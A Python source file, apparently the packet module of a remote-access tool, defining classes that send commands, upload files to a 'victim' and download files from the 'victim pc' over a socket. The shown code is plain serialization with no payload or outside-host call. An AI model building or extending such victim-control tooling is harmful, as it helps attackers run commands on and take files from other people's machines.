#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
The packets module.
======================

These modules is intented to complement protocol module. The packets are special classes
to create protocol packets.

The Packet class handle raw packets with a specific protocol code. The default code is the CMD code, but
any other protocol code can be used. Respose protocol codes should only be used for the victim socket.

The FileUploadPacket uses Packet as base class and handle a file upload to victim using the UPLOAD protocol
code. The class make the upload much more easy, but there is no problem to use the Packet class to send
files through socket, since the correct protocol code is used.

The FileDownloadPacket class also uses Packet as base class to handle a file download from victim pc.

"""

import sys
import protocol
from utils import DataInterface

class Packet(DataInterface):
    def __init__(self, content=None, params={}, code=None):
        """
        Create the packet object. The default code is the protocol CMD.

        :param content: The packet content.
        :param params: The packet optional parameters.
        :param code: The packet status code.
        :return: The Packet object.
        """
        self._content = content
        self._params = params
        self._code = code if code else protocol.CMD

    @property
    def content(self):
        """Get request content as bytes."""
        return self._content

    @property
    def params(self):
        """Get the request parameters."""
        return self._params

    def get_raw(self):
        """Get raw content to be sent over socket."""
        return protocol.build_packet(self._code, content=self._content, params=self._params)

class FileUploadPacket(Packet):
    def __init__(self, file, params={}, code=None):
        """
        Create a file packet to send files through socket.
        The default status code is the UPLOAD protocol code.

        :param file: The file path.
        :param params: Params to be sent with request.
        :return: The FileUploadPacket object.
        """
        self.file = file
        Packet.__init__(self, content=self.__get_content(), params=self.__parse_params(params), code=code if code else protocol.UPLOAD)

    @property
    def params(self):
        """Get the request parameters."""
        self._params['name'] = self.file.split('\\' if sys.platform.startswith('win32') else '/').pop()
        return self._params

    def __get_content(self):
        """
        Get content as bytes of a given file.

        :param file: Path to file.
        :return: The file content.
        """
        with open(self.file, 'rb') as handler:
            return handler.read()

    def __parse_params(self, params={}):
        """
        Parse parameters of request.

        :param params: Set of key:value params.
        :return: The new parameters.
        """
        if 'name' not in params:
            params['name'] = self.file
        return params

class FileDownloadPacket(Packet):
    def __init__(self, filename):
        """
        Create a packet to download a file on client.
        The default status code is the DOWNLOAD protocol code.

        :param filename: The file name to download.
        :return: The FileDownloadPacket object.
        """
        # Set the filename of the file to download on packet parameters.
        params = {'filename': filename}
        Packet.__init__(self, params=params, code=protocol.DOWNLOAD)
